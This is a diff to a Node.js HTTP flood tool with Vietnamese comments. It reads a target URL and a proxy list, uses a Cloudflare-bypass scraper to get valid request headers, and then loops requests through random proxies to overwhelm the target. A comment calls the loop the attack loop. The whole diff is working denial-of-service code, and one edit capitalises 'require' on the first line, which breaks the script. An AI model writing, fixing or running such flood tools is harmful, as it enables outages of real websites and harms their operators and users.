@@ -1,4 +1,4 @@
-require('events').EventEmitter.defaultMaxListeners = 0;
+Require('events').EventEmitter.defaultMaxListeners = 0;
 const fs = require('fs'),
     CloudScraper = require('cloudflare-scrapper'), 
     path = require('path');
@@ -17,10 +17,10 @@ const target = process.argv[2],
 
 let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
 
-async function send_req() {
+// VỊ TRÍ 1: HÀM ASYNC/AWAIT MỚI ĐỂ LẤY HEADERS (CẦN ĐẶT Ở NGOÀI send_req)
+let getHeaders = async function () {
     let proxy = proxies[Math.floor(Math.random() * proxies.length)];
 
-    let getHeaders = async function () {
     try {
         const response = await CloudScraper({
             uri: target,
@@ -29,9 +29,11 @@ async function send_req() {
             challengesToSolve: 10
         });
 
+        // Trả về headers (giống như Promise cũ)
         return response.request.headers; 
 
     } catch (error) {
+        // Xử lý lỗi (xóa proxy bị lỗi)
         let obj_v = proxies.indexOf(proxy);
         if (obj_v !== -1) {
             proxies.splice(obj_v, 1);
@@ -42,22 +44,35 @@ async function send_req() {
     }
 };
 
-        // Object.keys(result).forEach(function (i, e) {
-        //     console.log(i + ': ' + result[i]);
-        // });
+// VỊ TRÍ 2: HÀM ASYNC/AWAIT MỚI ĐỂ GỬI YÊU CẦU
+async function send_req() {
+    let proxy = proxies[Math.floor(Math.random() * proxies.length)];
+
+    try {
+        // 1. Chờ lấy headers an toàn
+        // (Sử dụng 'headers' thay vì 'result' để tránh nhầm lẫn)
+        const headers = await getHeaders(); 
+        
+        // 2. Vòng lặp tấn công (thay thế khối for/callback cũ)
+        
         for (let i = 0; i < req_per_ip; ++i) {
-            CloudScraper({
-                uri: target,
-                headers: result,
-                proxy: 'http://' + proxy,
-                followAllRedirects: false
-            }, function (error, response) {
-                if (error) {
-                    console.log(error.message);
-                }
-            });
+            try {
+                // Sử dụng await để gửi yêu cầu mạng an toàn
+                await CloudScraper({
+                    uri: target,
+                    headers: headers, // Sử dụng headers đã lấy từ getHeaders
+                    proxy: 'http://' + proxy,
+                    followAllRedirects: false
+                });
+            } catch (error) {
+                // Xử lý lỗi từng request trong vòng lặp
+                console.log(error.message);
+            }
         }
-    });
+
+    } catch (error) {
+        // Lỗi từ getHeaders đã được xử lý (xóa proxy)
+    }
 }
 
 setInterval(() => {
